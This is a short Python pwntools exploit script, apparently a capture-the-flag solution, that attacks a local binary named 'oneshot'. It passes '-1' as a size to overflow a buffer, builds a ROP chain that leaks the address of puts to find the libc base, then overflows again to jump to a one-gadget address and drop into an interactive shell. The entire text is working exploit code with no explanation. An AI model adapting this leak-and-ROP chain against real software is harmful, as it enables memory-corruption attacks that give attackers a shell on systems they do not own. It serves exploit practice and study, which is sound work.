from pwn import *

p = process('./oneshot')
e = ELF('./oneshot')
l = e.libc


oneshot = 0x45216
prdi = 0x00000000004007b3

p.sendlineafter(':', '-1')


payload = 'A'*(0x3f4+4)
payload += p64(prdi)
payload += p64(e.got['puts'])
payload += p64(e.plt['puts'])
payload += p64(e.symbols['main'])

p.sendafter(':', payload)
base = u64(p.recvuntil('\x7f')[-6:]+'\x00\x00')
base = base - l.symbols['puts']
print hex(base)

p.sendlineafter(':', '-1')
payload = 'A'*(0x3f4+4)
payload += p64(base+oneshot)

p.sendafter(':', payload)
p.interactive()
